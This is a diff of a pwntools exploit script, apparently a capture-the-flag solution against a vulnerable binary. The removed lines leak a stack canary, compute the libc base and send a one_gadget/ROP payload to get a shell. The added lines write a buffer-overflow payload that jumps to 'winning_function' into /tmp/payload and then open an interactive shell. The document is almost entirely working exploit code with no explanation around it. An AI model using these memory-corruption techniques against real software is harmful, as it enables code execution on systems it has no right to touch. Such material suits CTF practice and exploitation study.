@@ -43,35 +43,27 @@ if args.REMOTE:
 # Start program
 io = start()
 offset = 0
-# Build the payload
 
-# Send the payload
-io.sendafter(b"?", b"A" * 39 + b"~")
-io.recvuntil(b"~")
-canary = u64(io.recv(8).ljust(8, b"\x00"))
-printf = canary ^ 0x123456789ABCDEF1
-libc.address = printf - libc.sym["printf"]
+# Create empty file
 
-info("canary: " + hex(canary))
-info("printf: " + hex(printf))
-info("libc: " + hex(libc.address))
+f = open("/tmp/payload", "wb")
+f.write(b"\x00")
+f.close()
 
-# Clean buffer
-binsh = libc.search(b"/bin/sh\x00").__next__()
-poprdi = libc.search(asm("pop rdi; ret;")).__next__()
-one_gadget = libc.address + 0x10a2fc
+io.sendlineafter(b": ", b"/tmp/payload")
 
-offset = 40
-payload = flat({
-  offset: [
-    p64(canary),
-    cyclic(8),
-    p64(one_gadget),
-  ] 
-})
+payload = flat(
+  b"\x00" * 0x68,
+  elf.search(asm("ret")).__next__(),
+  elf.sym["winning_function"],
+)
 
-io.sendafter(b"again.", payload)
-# info("Canary: " + hex(LEAKED))
+f = open("/tmp/payload", "wb")
+f.write(payload)
+f.close()
 
-# # Got Shell?
+sleep(1)
+io.sendlineafter(b":", b"A")
+
+# Got Shell?
 io.interactive()
